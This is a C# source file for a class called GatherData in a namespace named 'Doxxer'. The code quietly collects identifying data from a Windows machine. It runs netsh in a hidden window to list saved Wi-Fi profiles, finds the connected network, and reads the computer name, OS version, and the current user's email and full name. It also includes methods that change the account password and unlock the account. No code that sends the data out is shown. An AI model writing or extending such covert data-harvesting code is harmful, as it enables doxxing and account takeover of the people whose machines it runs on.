using System;
using System.Diagnostics;
using System.DirectoryServices.AccountManagement;
using SimpleWifi;

namespace Doxxer
{
    public class GatherData
    {
        public GatherData()
        {
            GetWifi();
            getFullName();
        }

        private string GetWifi()
        {
            Process wifiProcess = new Process();
            wifiProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            wifiProcess.StartInfo.FileName = "netsh";
            wifiProcess.StartInfo.Arguments = "wlan show profile";
            wifiProcess.StartInfo.UseShellExecute = false;
            wifiProcess.StartInfo.RedirectStandardError = true;
            wifiProcess.StartInfo.RedirectStandardInput = true;
            wifiProcess.StartInfo.RedirectStandardOutput = true;
            wifiProcess.StartInfo.CreateNoWindow = true;
            wifiProcess.Start();
            string output = wifiProcess.StandardOutput.ReadToEnd();
            wifiProcess.WaitForExit();
            return output;
        }

        private AccessPoint getConnectedWifi()
        {
            Wifi wifi = new Wifi();
            foreach (var connection in wifi.GetAccessPoints())
            {
                if (connection.IsConnected)
                {
                    return connection;
                }
            }

            return null;
        }

        private string getComputerName()
        {
            return Environment.MachineName;
        }

        private Version getRuntimeVersion()
        {
            return Environment.Version;
        }

        private OperatingSystem getOSVersion()
        {
            return Environment.OSVersion;
        }

        private string getDirectory()
        {
            return Environment.SystemDirectory;
        }
        
        private string getUserEmail()
        {
            return UserPrincipal.Current.EmailAddress;
        }
        
        private string getFullName()
        {
            return UserPrincipal.Current.DisplayName;
        }
        
        private void setAccountPassword(String newPassword)
        {
            UserPrincipal.Current.SetPassword(newPassword);
        }
        
        private void unlockAccount()
        {
            UserPrincipal.Current.UnlockAccount();
        }
    }
}